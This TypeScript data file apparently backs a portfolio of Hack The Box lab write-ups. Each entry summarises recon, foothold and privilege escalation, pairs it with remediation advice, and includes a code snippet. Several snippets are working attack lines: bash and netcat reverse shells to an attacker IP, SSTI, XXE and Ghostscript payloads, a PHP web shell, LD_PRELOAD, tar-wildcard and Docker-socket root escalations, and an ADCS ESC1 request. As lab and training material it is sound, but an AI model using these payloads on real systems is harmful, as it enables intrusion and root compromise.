export interface LabItem {
  id: string;
  machineName: string;
  platform: 'Hack The Box' | 'Cisco Enterprise' | string;
  os: 'Linux' | 'Windows' | 'Network IOS';
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Advanced';
  status: 'Solved' | 'Pwned' | 'Completed';
  solvedDate: string;
  user: string;
  machineRank: string;
  machineState: 'Retired' | 'Active';
  xpEarned: number;
  rating: number;
  totalVotes: number;
  reviewsCount: number;
  imageUrl: string;
  description: string;
  subtitle: string;
  tags: string[];
  reconnaissance: string;
  initialFoothold: string;
  privilegeEscalation: string;
  codeSnippetTitle: string;
  codeSnippet: string;
  remediation: string[];
}

export const LABS_DATA: LabItem[] = [
  {
    id: 'htb-mythical-prolab',
    machineName: 'Mythical (Pro Lab)',
    platform: 'Hack The Box',
    os: 'Windows',
    difficulty: 'Advanced',
    status: 'Completed',
    solvedDate: '29 Sep 2026',
    user: 'WVLDH DANANJAYA',
    machineRank: 'Pro Lab #1',
    machineState: 'Active',
    xpEarned: 2500,
    rating: 5.0,
    totalVotes: 512,
    reviewsCount: 240,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790949787/Mythical_page-0001_nd1rdd.jpg',
    subtitle: 'HTB Mini Pro Lab • Active Directory & C2 • Verified',
    description: 'Official Hack The Box Mini Pro Lab: Mythical completed by WVLDH DANANJAYA (HTBCERT-640C44CA72, 10 CPE credits). Enterprise exploitation chain covering Active Directory enumeration, ADCS certificate services abuse, MSSQL attacks, and C2 operations.',
    tags: ['Active Directory', 'ADCS Abuse', 'Lateral Movement', 'MSSQL Attacks', 'C2 Operations', 'Pro Lab'],
    reconnaissance: 'Target scope consisted of a multi-tiered Active Directory forest with enterprise certificate authority, MSSQL database backends, and strict perimeter controls.',
    initialFoothold: 'Executed Kerberoasting and AS-REP roasting against vulnerable service accounts, cracked offline hashes, and established command execution via xp_cmdshell on exposed MSSQL instances.',
    privilegeEscalation: 'Identified misconfigured Certificate Template (ESC1) on ADCS. Generated rogue user certificate request for Domain Administrator impersonation and extracted NT hashes via DCSync.',
    codeSnippetTitle: 'Certipy ADCS Certificate Request & Authentication',
    codeSnippet: `# Request certificate for Administrator using ESC1 misconfiguration
certipy req -u 'svc_mssql@mythical.htb' -p 'DbPass123!' -ca 'MYTHICAL-CA' -template 'VulnerableTemplate' -upn 'Administrator@mythical.htb' -out admin.pfx

# Authenticate and retrieve Domain Admin NTLM hash
certipy auth -pfx admin.pfx -dc-ip 10.10.110.5`,
    remediation: [
      'Harden ADCS certificate templates and disable Enrollee Supplies Subject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) on privileged templates.',
      'Disable xp_cmdshell on MSSQL servers and enforce least-privilege service accounts.',
      'Deploy continuous Active Directory monitoring and auditing for suspicious certificate requests.'
    ]
  },
  {
    id: 'htb-puppet-prolab',
    machineName: 'Puppet (Pro Lab)',
    platform: 'Hack The Box',
    os: 'Windows',
    difficulty: 'Advanced',
    status: 'Completed',
    solvedDate: '12 Aug 2026',
    user: 'W V L D H DANANJAYA',
    machineRank: 'Pro Lab #2',
    machineState: 'Active',
    xpEarned: 2500,
    rating: 5.0,
    totalVotes: 490,
    reviewsCount: 215,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790949687/Puppet_page-0001_uhe6as.jpg',
    subtitle: 'HTB Mini Pro Lab • DevOps & Active Directory • Verified',
    description: 'Official Hack The Box Mini Pro Lab: Puppet completed by W V L D H DANANJAYA (HTBCERT-9A40EF5F6F, 10 CPE credits). Enterprise penetration testing focusing on Active Directory compromise, exploiting continuous delivery and DevOps infrastructure, and lateral movement.',
    tags: ['Active Directory', 'DevOps Infrastructure', 'CI/CD Pipelines', 'Lateral Movement', 'C2 Operations', 'Pro Lab'],
    reconnaissance: 'Reconnaissance mapped corporate Active Directory infrastructure integrated with automated continuous delivery tooling (Puppet/GitLab CI runners).',
    initialFoothold: 'Exploited unhardened DevOps agent with remote code execution privileges to extract cached deployment secrets and credentials from the runner environment.',
    privilegeEscalation: 'Leveraged Puppet manifest manipulation and insecure configuration synchronization to inject privileged agent execution tasks across target domain controllers.',
    codeSnippetTitle: 'Puppet Master Manifest Injection',
    codeSnippet: `# Inject privileged execution inside Puppet site manifest
cat << 'EOF' > /etc/puppetlabs/code/environments/production/manifests/site.pp
node default {
  exec { 'reverse_shell':
    command => '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.28/4444 0>&1"',
    path    => ['/usr/bin', '/usr/sbin', '/bin'],
  }
}
EOF`,
    remediation: [
      'Enforce signed manifests and code review requirements on Puppet repositories.',
      'Isolate CI/CD and configuration management nodes in a dedicated management VLAN with restricted outbound traffic.',
      'Restrict DevOps runner account permissions to non-domain administrative privileges.'
    ]
  },
  {
    id: 'htb-layover',
    machineName: 'Layover',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '27 Sep 2026',
    user: 'TheXGentleman',
    machineRank: '#281',
    machineState: 'Retired',
    xpEarned: 845,
    rating: 4.98,
    totalVotes: 412,
    reviewsCount: 189,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942424/Screenshot_From_2026-10-02_07-49-51_nsxhrt.png',
    subtitle: 'HTB • Linux • Rank #281 • Solved',
    description: 'Layover is a Linux machine featuring Server-Side Template Injection (SSTI) in a Python Jinja2 booking tracking system, leading to initial reverse shell access followed by privilege escalation via an unauthenticated internal daemon socket.',
    tags: ['Linux', 'SSTI', 'Jinja2', 'Python', 'Privilege Escalation', 'Socket IPC'],
    reconnaissance: 'Nmap revealed open ports 22 (SSH) and 80 (HTTP). Web enumeration identified a flight schedule lookup portal processing dynamic user flight input through a template engine.',
    initialFoothold: 'Tested for template evaluation with {{7*7}} resulting in 49. Crafted a Jinja2 sandbox escape payload using Python __mro__ subclasses to execute /bin/sh and catch an interactive netcat reverse shell.',
    privilegeEscalation: 'Enumerated listening ports on localhost using ss -tulpn. Discovered an internal Unix domain socket communicating with a root-level maintenance service. Sent crafted control commands to trigger arbitrary root command execution.',
    codeSnippetTitle: 'Python Jinja2 SSTI Remote Execution Payload',
    codeSnippet: `# SSTI Jinja2 Payload triggering reverse shell via subprocess.Popen
curl -X POST http://layover.htb/status \\
  -d "booking_ref={{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4444 >/tmp/f').read()}}"`,
    remediation: [
      'Implement strict input validation and avoid passing raw user input directly into Jinja2 render_template_string().',
      'Use sandboxed template environments (e.g. jinja2.sandbox.SandboxedEnvironment).',
      'Enforce authentication and POSIX permission checks on internal Unix domain sockets and IPC endpoints.'
    ]
  },
  {
    id: 'htb-abducted',
    machineName: 'Abducted',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '27 Sep 2026',
    user: 'TheXGentleman',
    machineRank: '#2344',
    machineState: 'Retired',
    xpEarned: 650,
    rating: 4.95,
    totalVotes: 320,
    reviewsCount: 142,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-50-31_qqvgmg.png',
    subtitle: 'HTB • Linux • Rank #2344 • Solved',
    description: 'Abducted is an engaging Linux machine focused on JSON Web Token (JWT) cryptographic weaknesses, privilege escalation through shared library hijacking, and misconfigured sudo permissions.',
    tags: ['Linux', 'JWT Attack', 'None Algorithm', 'LD_PRELOAD', 'Privilege Escalation'],
    reconnaissance: 'Nmap scan revealed HTTP port 80 and SSH port 22. Web application allowed user registration and issued HS256 signed JWT session cookies.',
    initialFoothold: 'Cracked weak HMAC secret using hashcat with rockyou.txt. Alternatively manipulated JWT header algorithm to "none" allowing unauthenticated admin impersonation and arbitrary file upload through the admin telemetry console.',
    privilegeEscalation: 'Checked sudo -l for user and identified an allowed binary execution with LD_PRELOAD preserved. Compiled a custom C shared object with a constructor calling setuid(0) and /bin/bash, executing with sudo to gain instant root.',
    codeSnippetTitle: 'C Shared Library Injection via LD_PRELOAD',
    codeSnippet: `#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}

// Compile: gcc -fPIC -shared -o /tmp/privesc.so /tmp/privesc.c -nostartfiles
// Execute: sudo LD_PRELOAD=/tmp/privesc.so /usr/bin/allowed_cmd`,
    remediation: [
      'Ensure sudoers file specifies "env_reset" and does not preserve LD_PRELOAD without explicit secure wrappers.',
      'Enforce strong JWT signature algorithms (RS256) with at least 2048-bit keys and explicitly reject "none" algorithm.',
      'Regularly audit sudo privileges for service accounts.'
    ]
  },
  {
    id: 'htb-makesense',
    machineName: 'MakeSense',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '26 Sep 2026',
    user: 'TheXGentleman',
    machineRank: '#4497',
    machineState: 'Retired',
    xpEarned: 845,
    rating: 4.96,
    totalVotes: 295,
    reviewsCount: 118,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-50-38_ebwa1n.png',
    subtitle: 'HTB • Linux • Rank #4497 • Solved',
    description: 'MakeSense is a Linux lab involving command injection in an administrative diagnostics utility and local privilege escalation via Python library hijacking in an automated root analytics script.',
    tags: ['Linux', 'Command Injection', 'Python Hijacking', 'Cronjob', 'Privilege Escalation'],
    reconnaissance: 'Service enumeration revealed an authenticated network utilities page with ping, traceroute, and packet diagnostic fields.',
    initialFoothold: 'Tested ping input with shell separators (`;` and `|`). Discovered unescaped system execution allowing shell injection to spawn a reverse shell connection.',
    privilegeEscalation: 'Identified a cronjob running /opt/analytics/report.py as root. The script imported "pandas" while searching the current writable working directory first. Created a malicious pandas.py in the directory to execute root bash upon cron trigger.',
    codeSnippetTitle: 'Diagnostic Command Injection & Python Library Hijack',
    codeSnippet: `// 1. Web Command Injection
POST /diagnostics/ping HTTP/1.1
Host: makesense.htb
ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/10.10.14.28/9001 0>&1'

// 2. /opt/analytics/pandas.py (Root Hijack)
import os
os.system("chmod +s /bin/bash")`,
    remediation: [
      'Replace direct shell commands with parametrized system APIs (e.g. Python subprocess.run(["ping", "-c", "4", target])) without shell=True.',
      'Configure Python module search path securely and avoid executing scripts in writable shared directories.',
      'Restrict cronjob access and isolate automated maintenance tasks.'
    ]
  },
  {
    id: 'htb-bedside',
    machineName: 'Bedside',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '26 Sep 2026',
    user: 'TheXGentleman',
    machineRank: '#4332',
    machineState: 'Retired',
    xpEarned: 845,
    rating: 4.94,
    totalVotes: 280,
    reviewsCount: 104,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-50-20_xuicvf.png',
    subtitle: 'HTB • Linux • Rank #4332 • Solved',
    description: 'Bedside simulates a medical facility server vulnerable to XML External Entity (XXE) injection on patient records, leading to sensitive SSH key leakage and NFS share root squashing exploitation.',
    tags: ['Linux', 'XXE Injection', 'NFS Abuse', 'no_root_squash', 'Information Disclosure'],
    reconnaissance: 'Port scan identified open ports 22, 80, 111 (rpcbind), and 2049 (NFS). Web service was an HL7 medical data ingestion portal taking XML payloads.',
    initialFoothold: 'Injected XML external entity referencing file:///home/physician/.ssh/id_rsa. Extracted private key and used it to log in via SSH with low-privilege access.',
    privilegeEscalation: 'Checked /etc/exports and noticed /var/nfs shared with no_root_squash. Mounted the export from the attacking machine as root, copied /bin/bash to the mount, set SUID bit, and ran it on target as root.',
    codeSnippetTitle: 'XXE Payload & NFS SUID Escalation',
    codeSnippet: `<!-- XXE Payload for SSH Key Disclosure -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/physician/.ssh/id_rsa" >]>
<patientRecord><id>&xxe;</id></patientRecord>

<!-- NFS Root Squash SUID Exploitation -->
mount -t nfs 10.10.11.x:/var/nfs /mnt/target
cp /bin/bash /mnt/target/rootbash
chmod +xs /mnt/target/rootbash
# On victim: /var/nfs/rootbash -p`,
    remediation: [
      'Disable external DTD and external entity resolution in XML parsers (e.g. setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)).',
      'Remove no_root_squash from NFS export options in /etc/exports.',
      'Implement strict firewall egress filtering to prevent unauthorized NFS mounts.'
    ]
  },
  {
    id: 'htb-cohort',
    machineName: 'Cohort',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '24 Sep 2026',
    user: 'TheXGentleman',
    machineRank: '#6109',
    machineState: 'Retired',
    xpEarned: 585,
    rating: 4.92,
    totalVotes: 340,
    reviewsCount: 130,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-50-13_hxequf.png',
    subtitle: 'HTB • Linux • Rank #6109 • Solved',
    description: 'Cohort is a Linux machine featuring an exposed .git version control repository leaking database credentials, followed by Unix tar wildcard command injection for root privilege escalation.',
    tags: ['Linux', 'Git Exposure', 'Source Code Audit', 'Tar Wildcard', 'Privilege Escalation'],
    reconnaissance: 'Discovered HTTP 80 running an internal development tracking tool. Web directory enumeration identified an exposed .git/ directory accessible via HTTP.',
    initialFoothold: 'Used git-dumper to recover the full repository history. Reviewed commit diffs to discover database configuration files and plaintext SSH credentials for user developer.',
    privilegeEscalation: 'Inspected scheduled cronjobs and discovered root running tar -czf /backup/backup.tar.gz * inside /var/www/uploads/. Created files named --checkpoint=1 and --checkpoint-action=exec=sh exploit.sh to exploit wildcard expansion.',
    codeSnippetTitle: 'Tar Wildcard Privilege Escalation Exploit',
    codeSnippet: `# Navigate to monitored backup directory
cd /var/www/uploads

# Create payload shell script
echo "chmod +s /bin/bash" > shell.sh
chmod +x shell.sh

# Exploit tar checkpoint option parsing via wildcard
touch "/var/www/uploads/--checkpoint=1"
touch "/var/www/uploads/--checkpoint-action=exec=sh shell.sh"
# Wait for root cronjob -> /bin/bash -p`,
    remediation: [
      'Block public web server access to .git and other hidden configuration directories in Nginx/Apache configuration.',
      'Never hardcode production credentials or keys inside version control repositories.',
      'Avoid using wildcards (*) in automated scripts running with root privileges.'
    ]
  },
  {
    id: 'htb-cap',
    machineName: 'Cap',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '31 Jul 2026',
    user: 'TheXGentleman',
    machineRank: '#99949',
    machineState: 'Retired',
    xpEarned: 450,
    rating: 4.97,
    totalVotes: 512,
    reviewsCount: 220,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942425/Screenshot_From_2026-10-02_07-46-58_eq2vlu.png',
    subtitle: 'HTB • Linux • Rank #99949 • Solved',
    description: 'Cap is an iconic Linux lab demonstrating Insecure Direct Object Reference (IDOR) on network capture files to extract plaintext credentials, and abusing Linux Capabilities (cap_setuid) for instant root shell.',
    tags: ['Linux', 'IDOR', 'PCAP Analysis', 'Linux Capabilities', 'Wireshark'],
    reconnaissance: 'Port scan revealed port 21 (FTP), 22 (SSH), and 80 (HTTP). Web application allowed administrators to capture live network traffic and download PCAP captures.',
    initialFoothold: 'Identified IDOR vulnerability on the URL path /data/5 by changing the index parameter to /data/0. Downloaded 0.pcap and analyzed with tshark/Wireshark to recover plaintext FTP credentials for user nathan.',
    privilegeEscalation: 'Logged in via SSH as nathan. Ran getcap -r / 2>/dev/null to check binary capabilities. Found /usr/bin/python3.8 possessed cap_setuid+ep, allowing setuid(0) invocation to drop directly into a root shell.',
    codeSnippetTitle: 'PCAP Credential Extraction & Capabilities Root Shell',
    codeSnippet: `# 1. Extract plaintext credentials from PCAP file via tshark
tshark -r 0.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.arg

# 2. Exploit Linux cap_setuid capability on python3 binary
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`,
    remediation: [
      'Enforce strict authorization checks on object references (/data/{id}) to prevent IDOR traversal.',
      'Never transmit administrative or authentication credentials over unencrypted protocols (use SFTP/FTPS instead of FTP).',
      'Audit and restrict Linux file capabilities using getcap to prevent unprivileged setuid escalation.'
    ]
  },
  {
    id: 'htb-fireflow',
    machineName: 'Fireflow',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '28 Jul 2026',
    user: 'TheXGentleman',
    machineRank: '#1183',
    machineState: 'Retired',
    xpEarned: 650,
    rating: 4.96,
    totalVotes: 308,
    reviewsCount: 125,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942424/Screenshot_From_2026-10-02_07-49-58_rmwnow.png',
    subtitle: 'HTB • Linux • Rank #1183 • Solved',
    description: 'Fireflow is a Linux lab involving Werkzeug debug console PIN reconstruction via local file disclosure, followed by Ansible playbook sudo exploitation to achieve root privileges.',
    tags: ['Linux', 'Werkzeug Debug', 'LFI PIN Recovery', 'Ansible Sudo', 'Privilege Escalation'],
    reconnaissance: 'Nmap found port 80 and port 5000 running a Python Flask application in development mode with active Werkzeug debugger.',
    initialFoothold: 'Used path traversal in report download endpoint to read /sys/class/net/eth0/address (MAC) and /etc/machine-id. Fed parameters into Werkzeug PIN generation algorithm to unlock interactive Python console on port 5000.',
    privilegeEscalation: 'Checked sudo -l and discovered permission to run ansible-playbook as root. Authored a minimal YAML playbook with local connection and tasks running /bin/bash SUID creation.',
    codeSnippetTitle: 'Ansible Playbook Sudo Privilege Escalation',
    codeSnippet: `- hosts: localhost
  connection: local
  tasks:
    - name: Spawn Root Shell
      command: /bin/bash -c "chmod +s /bin/bash"

# Execution:
sudo ansible-playbook /tmp/playbook.yml
/bin/bash -p`,
    remediation: [
      'Never deploy Flask / Werkzeug applications in production with debug=True or accessible debug pin console.',
      'Patch local file inclusion vectors by validating file paths against a strict allowlist.',
      'Restrict sudo access to configuration management binaries like ansible-playbook which can execute arbitrary shell tasks.'
    ]
  },
  {
    id: 'htb-orion',
    machineName: 'Orion',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Medium',
    status: 'Pwned',
    solvedDate: '02 Aug 2026',
    user: 'TheXGentleman',
    machineRank: '#3544',
    machineState: 'Retired',
    xpEarned: 450,
    rating: 4.93,
    totalVotes: 360,
    reviewsCount: 154,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-50-07_ewakbn.png',
    subtitle: 'HTB • Linux • Rank #3544 • Solved',
    description: 'Orion is a Medium-tier Linux lab involving stacked SQL Injection in an enterprise monitoring dashboard and breaking out of restricted shells using insecure sudo archiving binaries.',
    tags: ['Linux', 'SQL Injection', 'INTO OUTFILE', 'Web Shell', 'Privilege Escalation'],
    reconnaissance: 'Port scan identified ports 22, 80, and 3306 (MySQL). Discovered an administrative authentication portal with search filter parameter.',
    initialFoothold: 'Identified error-based SQL Injection in sensor query parameter. Dumped user hashes, then leveraged elevated MySQL FILE privileges to write a PHP web shell directly into /var/www/html/uploads/shell.php.',
    privilegeEscalation: 'Gained shell as www-data. Discovered a custom backup script executing 7z with elevated capabilities without input sanitation, allowing arbitrary command execution to obtain root.',
    codeSnippetTitle: 'MySQL INTO OUTFILE Web Shell Injection',
    codeSnippet: `SELECT '' INTO OUTFILE '/var/www/html/shell.php'
LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e;

# Trigger web shell reverse connection:
curl "http://orion.htb/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.28/4444+0>%261'"`,
    remediation: [
      'Use parameterized queries and PreparedStatements across all database interactions.',
      'Revoke the FILE privilege and secure_file_priv from the database service user.',
      'Ensure the web server user does not possess write access to the webroot document directories.'
    ]
  },
  {
    id: 'htb-connected',
    machineName: 'Connected',
    platform: 'Hack The Box',
    os: 'Windows',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '09 Jun 2026',
    user: 'TheXGentleman',
    machineRank: '#3608',
    machineState: 'Retired',
    xpEarned: 585,
    rating: 4.95,
    totalVotes: 380,
    reviewsCount: 162,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-50-45_ntzvlz.png',
    subtitle: 'HTB • Windows • Rank #3608 • Solved',
    description: 'Connected is a Windows target running IIS with an insecure file upload mechanism, coupled with misconfigured AlwaysInstallElevated registry keys permitting SYSTEM privilege escalation via MSI.',
    tags: ['Windows', 'IIS Web', 'File Upload Bypass', 'AlwaysInstallElevated', 'SYSTEM PrivEsc'],
    reconnaissance: 'Nmap revealed ports 80 (IIS 10.0), 135 (MSRPC), 445 (SMB), and 5985 (WinRM). Web application hosted a contact portal allowing attachment uploads.',
    initialFoothold: 'Bypassed client-side file extension check by intercepting the upload request in Burp Suite and uploading a .aspx webshell. Executed PowerShell reverse shell to gain foothold as iis apppool\\defaultapppool.',
    privilegeEscalation: 'Queried registry keys: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated and found value 0x1 on both HKLM and HKCU. Generated an elevated MSI payload with msfvenom to add a local administrator.',
    codeSnippetTitle: 'AlwaysInstallElevated MSI Payload & Execution',
    codeSnippet: `# Generate malicious MSI payload
msfvenom -p windows/x64/exec CMD="net localgroup administrators dananjaya /add" -f msi -o update.msi

# Execute via Windows Installer with elevated SYSTEM rights
msiexec /quiet /qn /i update.msi`,
    remediation: [
      'Disable AlwaysInstallElevated policy in Group Policy Object (GPO) for both Computer and User configuration.',
      'Block execution of scripts (.aspx, .asp, .php) inside uploads directories using IIS Request Filtering.',
      'Run application pools with managed service accounts (gMSA) adhering to least privilege principle.'
    ]
  },
  {
    id: 'htb-smarthire',
    machineName: 'SmartHire',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '09 Jun 2026',
    user: 'TheXGentleman',
    machineRank: '#2130',
    machineState: 'Retired',
    xpEarned: 845,
    rating: 4.94,
    totalVotes: 310,
    reviewsCount: 129,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-51-23_dknbfb.png',
    subtitle: 'HTB • Linux • Rank #2130 • Solved',
    description: 'SmartHire simulates a recruitment portal vulnerable to polyglot PDF resume upload exploitation, leading to container breakout and sudo cron privilege escalation to root.',
    tags: ['Linux', 'Polyglot PDF', 'Resume Upload', 'Cronjob Abuse', 'Privilege Escalation'],
    reconnaissance: 'Enumerated web service running a candidate resume processing engine with PDF thumbnail rendering.',
    initialFoothold: 'Exploited a Ghostscript command execution vulnerability embedded inside a crafted PostScript / PDF file to trigger a reverse shell upon server-side thumbnail generation.',
    privilegeEscalation: 'Discovered an internal recruiter report processing script running every 5 minutes as root. The script parsed employee salary CSV files with an unquoted command evaluation, allowing injected shell commands.',
    codeSnippetTitle: 'PostScript Polyglot Command Execution Header',
    codeSnippet: `%PDF-1.4
%PostScript execution injection
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
{ (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4444 >/tmp/f) .system } stopped pop
showpage`,
    remediation: [
      'Update ImageMagick and Ghostscript to the latest patched releases with -dSAFER enforced.',
      'Sanitize CSV and spreadsheet cells against formula and macro injection vulnerabilities.',
      'Run background worker processes inside sandboxed unprivileged containers.'
    ]
  },
  {
    id: 'htb-devhub',
    machineName: 'DevHub',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Medium',
    status: 'Pwned',
    solvedDate: '08 Jun 2026',
    user: 'TheXGentleman',
    machineRank: '#5995',
    machineState: 'Retired',
    xpEarned: 845,
    rating: 4.98,
    totalVotes: 420,
    reviewsCount: 195,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-50-52_jajkqn.png',
    subtitle: 'HTB • Linux • Rank #5995 • Solved',
    description: 'DevHub is a developer platform lab involving Server-Side Request Forgery (SSRF) via Git webhooks, internal token extraction, and breaking out of Docker via exposed socket socket access.',
    tags: ['Linux', 'Git Webhooks', 'SSRF', 'Docker Socket', 'Container Escape'],
    reconnaissance: 'Nmap revealed ports 22, 80, and 3000 (Gitea / Custom Git Portal). Created user account and explored webhook dispatch capabilities.',
    initialFoothold: 'Set up an internal webhook pointing to 127.0.0.1:8080/internal/api/secrets. Extracted internal deployment API keys and used them to push a malicious Git pre-receive hook that spawned a reverse shell.',
    privilegeEscalation: 'Inside the container, found /var/run/docker.sock mounted with read-write permissions. Mounted the host root filesystem into a new Alpine container and spawned an interactive chroot shell directly as root.',
    codeSnippetTitle: 'Docker Socket Escape Command Sequence',
    codeSnippet: `# Query Docker daemon socket inside container
docker -H unix:///var/run/docker.sock images

# Spawn privileged container mounting host root filesystem
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash`,
    remediation: [
      'Never mount /var/run/docker.sock into application containers.',
      'Implement egress IP filtering and restrict webhooks from resolving loopback (127.0.0.1/8) or link-local metadata addresses.',
      'Run Docker containers in rootless mode with user namespaces enabled.'
    ]
  },
  {
    id: 'htb-reactor',
    machineName: 'Reactor',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '25 May 2026',
    user: 'TheXGentleman',
    machineRank: '#3990',
    machineState: 'Retired',
    xpEarned: 585,
    rating: 4.91,
    totalVotes: 290,
    reviewsCount: 110,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-50-59_wqhvc0.png',
    subtitle: 'HTB • Linux • Rank #3990 • Solved',
    description: 'Reactor is a Linux machine featuring Apache Solr Velocity template injection (CVE-2019-17558) and privilege escalation via a world-writable systemd maintenance service.',
    tags: ['Linux', 'Apache Solr', 'CVE-2019-17558', 'Velocity Injection', 'Systemd Timer'],
    reconnaissance: 'Port scan identified open ports 22, 80, and 8983 (Apache Solr search server).',
    initialFoothold: 'Enumerated Solr cores and discovered custom configset allowing velocity custom params. Sent an HTTP POST payload enabling velocityResponseWriter and injected Java runtime exec to execute reverse shell.',
    privilegeEscalation: 'Analyzed systemd timers and identified clean-logs.timer firing clean-logs.service as root. The target script /usr/local/bin/clean-logs.sh had world-writable 777 permissions. Appended reverse shell to script.',
    codeSnippetTitle: 'Apache Solr Velocity RCE HTTP Request',
    codeSnippet: `POST /solr/core1/config HTTP/1.1
Host: reactor.htb:8983
Content-Type: application/json

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}`,
    remediation: [
      'Upgrade Apache Solr to a version mitigating CVE-2019-17558 and disable VelocityResponseWriter.',
      'Ensure Solr administrative interface is bound only to localhost or protected behind strong authentication.',
      'Verify strict ownership and 755/700 file permissions on all binaries and scripts executed by systemd services.'
    ]
  },
  {
    id: 'htb-kobold',
    machineName: 'Kobold',
    platform: 'Hack The Box',
    os: 'Linux',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '10 Jun 2026',
    user: 'TheXGentleman',
    machineRank: '#8723',
    machineState: 'Retired',
    xpEarned: 585,
    rating: 4.93,
    totalVotes: 315,
    reviewsCount: 135,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-51-33_mcgfcj.png',
    subtitle: 'HTB • Linux • Rank #8723 • Solved',
    description: 'Kobold is an entry-level Linux machine demonstrating Local File Inclusion (LFI) chained with Apache log poisoning, followed by an unsafe SUID path hijacking exploit.',
    tags: ['Linux', 'LFI', 'Log Poisoning', 'SUID Abuse', 'PATH Hijacking'],
    reconnaissance: 'Web enumeration revealed a modular PHP application loading templates via ?page= parameter. Discovered /etc/passwd disclosure through directory traversal.',
    initialFoothold: 'Identified readability of Apache access log at /var/log/apache2/access.log. Injected PHP payload <?php system($_GET["c"]); ?> into User-Agent header, then requested access log with &c=id to verify execution.',
    privilegeEscalation: 'Searched for SUID binaries with find / -perm -4000 2>/dev/null. Identified /opt/backup/backup_tool which executed system("tar ...") with a relative binary path. Prepended /tmp to $PATH with a malicious tar script.',
    codeSnippetTitle: 'Apache Log Poisoning & SUID PATH Hijack',
    codeSnippet: `# 1. Log Poisoning via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://kobold.htb/

# 2. Trigger reverse shell via poisoned log
curl "http://kobold.htb/index.php?page=../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.28/4444+0>%261'"

# 3. Path Hijacking on SUID binary
echo "/bin/bash -p" > /tmp/tar && chmod +x /tmp/tar
export PATH=/tmp:$PATH
/opt/backup/backup_tool`,
    remediation: [
      'Eliminate dynamic file inclusion using user-supplied parameters; use an explicit whitelist of allowed templates.',
      'Restrict web server log permissions so they are not readable by the www-data service account.',
      'Always invoke executables using absolute paths (/usr/bin/tar) inside SUID programs.'
    ]
  },
  {
    id: 'htb-wingdata',
    machineName: 'WingData',
    platform: 'Hack The Box',
    os: 'Windows',
    difficulty: 'Easy',
    status: 'Pwned',
    solvedDate: '15 Jun 2026',
    user: 'TheXGentleman',
    machineRank: '#11013',
    machineState: 'Retired',
    xpEarned: 585,
    rating: 4.95,
